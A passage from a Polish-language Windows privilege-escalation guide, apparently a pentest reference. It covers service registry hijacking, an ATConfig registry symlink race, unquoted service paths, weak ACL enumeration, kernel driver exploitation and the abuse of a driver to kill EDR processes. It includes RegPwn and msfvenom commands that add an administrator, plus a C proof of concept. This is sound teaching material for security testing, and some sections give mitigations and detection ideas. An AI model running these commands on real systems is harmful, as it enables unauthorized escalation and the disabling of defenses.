reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig dowiązań symbolicznych rejestru umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Wyścig dowiązań symbolicznych** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość **zapisu dowolnej wartości** HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje kontrolowaną przez użytkownika konfigurację.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania lub przejść do bezpiecznego pulpitu i jest zapisywalny przez użytkownika.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą chcesz, aby zapisał SYSTEM.
2. Wywołaj kopiowanie na bezpiecznym pulpicie (np. **LockWorkstation**), co uruchamia przepływ brokera AT.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy zadziała oplock, zastąp klucz **HKLM Session ATConfig** **dowiązaniem rejestru** do chronionego celu HKLM.
4. SYSTEM zapisuje wybraną przez atakującego wartość do przekierowanej ścieżki HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM można przejść do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz takie uprawnienia do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows **wystarczy to do wykonania dowolnego kodu:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdy człon ścieżki kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie ścieżki usług nieujęte w cudzysłowy, z wyłączeniem tych należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę lukę za pomocą metasploit: `exploit/windows/local/trusted\_service\_path`. Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Akcje odzyskiwania

Windows umożliwia użytkownikom określenie działań podejmowanych w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, eskalacja uprawnień może być możliwa. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Cele skryptów zadań zaplanowanych

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź zarówno skrypt wskazany w **argumentach akcji**, jak i `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShellu. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShella z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń w powłoce wymagają ręcznego prześledzenia. Skrypt lub jego katalog nadrzędny, do którego wywołujący może zapisywać, stanowi potencjalną drogę do wykonania kodu z konta innego użytkownika tylko wtedy, gdy skonfigurowany principal zadania różni się od konta wywołującego, a zadanie faktycznie dochodzi do tej akcji. ACL pozwalający wyłącznie na dopisywanie może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może sprawić, że dopisane wiersze będą nieosiągalne. Przed stwierdzeniem, że możliwa jest eskalacja, potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Nazwane strumienie w dostępnych plikach

W systemie NTFS plik, który można odczytać, może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna na zwykłej liście katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem jakiejkolwiek zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je za pomocą [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz polecenia PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu jest jedynie wskazówką. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, na które faktycznie się uwierzytelniają. Podczas rutynowej enumeracji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Dane wejściowe pomocnika Windows Driver Kit uruchamianego w ramach zadania zaplanowanego

Opcjonalny pakiet Windows Driver Kit zawiera `StandaloneRunner.exe`, który może odczytywać pliki `command.txt`, `reboot.rsf` i plik projektu `working\rsf.rsf` ze swojego katalogu roboczego. Zadanie zaplanowane lub usługa uruchamiająca ten pomocnik z uprzywilejowanym kontem może umożliwić wykonanie poleceń w kontekście tego konta dzięki uprawnieniom zapisu o niskim poziomie do tych plików wejściowych, nawet jeśli sam plik wykonywalny pomocnika jest chroniony. Potwierdź, że pliki są używane przez uprzywilejowany proces oraz że można utworzyć lub zmodyfikować **oba** pliki pomocnicze; samo znalezienie pomocnika nie wystarczy.

W przypadku zadania zaplanowanego sprawdź [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) akcji oraz ACL obu ścieżek do plików pomocniczych. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do weryfikacji, a nie dowodem na to, skąd zadanie odczytuje dane wejściowe. Musi być również spełniony warunek dotyczący pliku roboczego projektu. Sprawdź rzeczywisty principal zadania zamiast zakładać, że działa ono jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może możesz podmienić jeden z nich i eskalować uprawnienia) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk w Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie uruchamiały istniejący wcześniej plik chroniony przed zapisem, gdy jego zastąpienie się nie powiodło. Producent naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny poziom zainstalowanej poprawki oraz to, czy można uruchomić podatną operację agenta; sama etykieta gałęzi, np. `2.1`, nie wystarcza, by stwierdzić podatność. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do katalogu Temp bez tworzenia plików ani wywoływania poleceń agenta.

#### Przegląd usługi SAML w ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyła kompilacji ADSelfService Plus 6210 i starszych; producent naprawił problem w kompilacji 6211. Ma znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie werdykt o podatności: potwierdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci i konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; uruchomienie jako SYSTEM wymaga instancji działającej jako SYSTEM. Możliwy do odczytu plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępne poświadczenie ani na tę lukę SAML. Podczas rutynowej enumeracji zanotuj jego ścieżkę i uprawnienia dostępu, nie rozpakowując go.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins w Windows odróżnij uprawnienie do tworzenia lub konfigurowania zadania od uprawnienia do jego uruchamiania: [Jenkins opisuje je jako odrębne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalny wyzwalacz może zapewniać inną ścieżkę uruchomienia kompilacji, ale potwierdź, że jest włączona i że kompilacja rzeczywiście się wykonuje. Proces działa z tożsamością kontrolera lub wybranego agenta, a zapisane poświadczenie można wykorzystać tylko wtedy, gdy zadanie ma dostęp do jego zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje materiał poświadczeń i klucze szyfrujące w `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; zweryfikuj **dostęp do odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wypisując sekretów we wspólnym wyniku. Jeśli konto ma prawo zapisu do atrybutu obiektu użytkownika AD `scriptPath`, potwierdź, że ścieżka skryptu jest zapisywalna oraz że istnieje rzeczywiste logowanie lub zaplanowany proces uruchamiany jako użytkownik docelowy, zanim uznasz to za wykonanie między użytkownikami. Dalsza kontrola grup wymaga odrębnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość agenta self-hosted w Azure Pipelines

W przypadku projektu Azure DevOps Server lub Azure Pipelines odróżnij uprawnienie do **tworzenia lub edytowania** pipeline'u od uprawnienia do jego **umieszczania w kolejce** i korzystania z wybranej puli agentów; [Microsoft osobno opisuje uprawnienia do pipeline'ów](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić pipeline na agencie self-hosted dla Windows, krok wykona się jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz przejście między użytkownikami lub uzyskanie uprawnień SYSTEM, sprawdź konkretny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, zadanie gotowe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie ani sam dostęp do zapisu w repozytorium to tylko wskazówki; podczas pasywnej enumeracji przejrzyj uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Poświadczenia Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, które uruchamia usługę synchronizacji i uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Poświadczenia łącznika są przechowywane w tej bazie danych w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, lokalna grupa sugerująca uprawnienia administratora ani dostęp do bazy danych nie dowodzą, że można odszyfrować poświadczenie lub eskalować uprawnienia w domenie. Osobno sprawdź rzeczywiste uprawnienia do odczytu bazy danych, dostęp konta usługi do klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia tej tożsamości w AD. Rutynowa enumeracja powinna ujawniać wyłącznie metadane usługi i dostępu, a nie odczytywać ani wyświetlać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługujących sterownik drukarki

Zainstalowany sterownik drukarki może przechowywać pomocnicze biblioteki DLL w `C:\ProgramData` i ładować je w bardziej uprzywilejowanym procesie drukowania. Sprawdź dokładny katalog sterownika i ACL bibliotek DLL, w tym katalogów nadrzędnych oraz punktów ponownej analizy, nawet jeśli enumeracja drukarek przez WMI jest niedostępna. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [oryginalny opis](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapisywalny ACL to tylko wskazówka: sprawdź efektywny dostęp do zapisu po uwzględnieniu wpisów odmawiających dostępu, czy odpowiedni sterownik jest zainstalowany i ładuje plik z tożsamością o wyższych uprawnieniach oraz czy producent naprawił instalację w zaktualizowanym sterowniku lub programie zabezpieczającym. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu lub wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać określony plik, albo zmodyfikować plik binarny, który ma zostać uruchomiony przez konto Administratora (schedtasks).

Sposobem na znalezienie w systemie słabo zabezpieczonych uprawnień do folderów/plików jest wykonanie:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Trwałość/wykonywanie przez automatyczne ładowanie pluginów Notepad++

Notepad++ automatycznie ładuje wszystkie biblioteki DLL pluginów znajdujące się w podfolderach `plugins`. Jeśli dostępna jest zapisywalna instalacja przenośna/kopia, umieszczenie złośliwego pluginu zapewnia automatyczne wykonanie kodu w `notepad++.exe` przy każdym uruchomieniu (również z `DllMain` i callbacków pluginu).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie podczas startu

**Sprawdź, czy możesz nadpisać jakiś klucz rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Poszukaj potencjalnie **dziwnych/podatnych sterowników firm trzecich**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia prymityw umożliwiający dowolny odczyt/zapis w kernelu (częste w źle zaprojektowanych handlerach IOCTL), możesz podnieść uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela.<sup>[[13]](#references)</sup> Opis techniki krok po kroku:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

W przypadku błędów typu race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (za pomocą komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF-y w kolejkach cancel-safe, ujawnienia danych z paged-pool i wykorzystanie I/O ring

Niektóre łańcuchy Windows kernel LPE można zbudować z dwóch osobno mało groźnych błędów: **race condition dotyczącego czasu życia kolejki cancel-safe**, która zwalnia żądanie/CBD, gdy blokada kolejki jest nadal utrzymywana, oraz ujawnienia danych **przed zwolnieniem blokady**, które wycieka zwolnioną alokację paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i wykorzystania:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu wywołuje `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolnione `PFLT_CALLBACK_DATA` do callbacku usuwającego element ze sterownika.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged-pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy Data Queue Entries w `NPFS` są przydatne, ponieważ można kontrolować ich zawartość i rozmiar, a później sprawdzać je operacjami odczytu/podglądu potoku. Jeśli zwolniony obiekt zawiera wskaźniki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby sterownik wielokrotnie przetwarzał struktury żądań zdefiniowane przez atakującego zamiast zakończyć działanie na pierwotnej głowie listy.
- **Rozwiń przewidywalny zapis**: jeśli fałszywe żądanie przekieruje zagnieżdżony wskaźnik kontekstu używany przy zapisach księgowych (znaczniki czasu / QPC / pola sąsiadujące z licznikiem referencji), możesz uzyskać zapis do kontrolowanego adresu, ale z niekontrolowaną wartością. W takim przypadku zaatakuj pole **długości/rozmiaru** obiektu w spryskanej puli zamiast końcowego wskaźnika kodu/danych, a następnie przeszukaj spryskane obiekty, aż uszkodzony obiekt umożliwi **odczyt poza zakresem z paged-pool**.
- **Wzorzec ujawnienia podatny na race condition**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność wzrasta, gdy atakujący może powiększyć kopiowany bufor (na przykład dodając wiele wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie wydłuża okno na podmianę bez konieczności awarii systemu.
- **Cele do ponownego zapełnienia zawierające wiele wskaźników**: zarejestrowane tablice buforów Windows **I/O ring** są doskonałymi celami ujawnienia danych, ponieważ ich rozmiar w paged-pool jest kontrolowany przez atakującego (`8 * regBufferCnt`), a każdy element jest wskaźnikiem kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odtwórz otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały ze sfałszowanych przez atakującego wpisów i umożliwiały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby utworzyć wskaźnik użytkownika składający się z powtarzających się bajtów, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam sfałszowaną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki diagnostyczne:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu dowolnego odczytu/zapisu w kernelu dzięki uszkodzonemu I/O ring ukradnij token SYSTEM, korzystając ze standardowej procedury po uzyskaniu prymitywu:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Prymitywy korupcji pamięci hive rejestru

Współczesne podatności hive pozwalają przygotować deterministyczny układ pamięci, wykorzystać zapisywalne elementy potomne HKLM/HKU i przekształcić korupcję metadanych w przepełnienia paged pool w kernelu bez niestandardowego drivera. Pełny łańcuch opisano tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomieszanie typów w trybie direct `RtlQueryRegistryValues` dla ścieżek kontrolowanych przez atakującego

Niektóre drivery przyjmują ścieżkę rejestru z przestrzeni użytkownika, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` i wskaźnikiem do skalarnej zmiennej na stosie, takiej jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowany zgodnie z **rzeczywistym** typem rejestru, a nie typem oczekiwanym przez programistę.

Daje to dwa przydatne prymitywy:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zdezorientowany pełnomocnik / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala driverowi odpytywać wybrane przez atakującego klucze, ujawniać ich istnienie przez kody zwrotne/logi, a czasami odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci kernela**: skalarne miejsce docelowe, takie jak `&readValue`, może zostać błędnie zinterpretowane jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze — zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploitacji:

- **Mitigacja w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego hive** z `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernela kończą się awarią `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość exploitacji, szukaj **kluczy z możliwością zapisu w zaufanych hive systemu**, zamiast umieszczać wartości w `HKCU`.
- **Przygotowanie w zaufanym hive**: użyj NtObjectManager do wyszukania zapisywalnych elementów potomnych `\Registry\Machine`, a następnie ponownie uruchom skanowanie z zduplikowanym tokenem o **niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxa:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacka/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni oczekuje, że `EntryContext` będzie wskazywać na `UNICODE_STRING`. Jeśli kod najpierw wczyta kontrolowaną przez atakującego wartość `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie użyje tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, uzyskując częściowo kontrolowany zapis w kernelu.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli poprzedni odczyt `REG_DWORD` pozostawi ujemną wartość kontrolowaną przez atakującego w ponownie użytej zmiennej skalarnej, następne zapytanie `REG_BINARY` kopiuje bajty kontrolowane przez atakującego bezpośrednio do sąsiednich slotów na stosie. To często najprostsza droga do pełnego nadpisania wskaźnika callbacka.

Wzorzec, którego warto szukać: **niejednorodne odczyty z rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Szukaj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używanych wskaźników `EntryContext` oraz ścieżek kodu, w których pierwszy odczyt z rejestru decyduje o tym, czy nastąpi drugi odczyt.

#### Nadużycie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + unieszkodliwienie EDR)

Niektóre podpisane sterowniki innych firm tworzą obiekt urządzenia z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana, gdy urządzenie jest otwierane za pomocą ścieżki zawierającej dodatkowy komponent. Dzięki temu każdy nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw, takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z przypadku z prawdziwego świata)

Gdy użytkownik może otworzyć urządzenie, może nadużyć udostępnionych przez sterownik uprzywilejowanych IOCTL-i w celu uzyskania LPE i manipulowania systemem. Zaobserwowane w praktyce możliwości obejmują:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokena / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowych danych na dysku (manipulowanie systemem offline, sztuczki z trwałością podczas rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala zabić AV/EDR z poziomu przestrzeni użytkownika za pośrednictwem kernela.

Minimalny wzorzec PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla programistów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego w przypadku uprzywilejowanych operacji. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTL (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele brokerowane zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie przez procesy w trybie użytkownika podejrzanych nazw urządzeń (np. \\ .\\amsdk*) oraz określonych sekwencji IOCTL wskazujących na nadużycie.
- Wymuszaj stosowanie listy zablokowanych podatnych sterowników firmy Microsoft (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych i zablokowanych elementów.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się w PATH**, możesz przejąć kontrolę nad biblioteką DLL ładowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów znajdujących się w PATH:

```bash
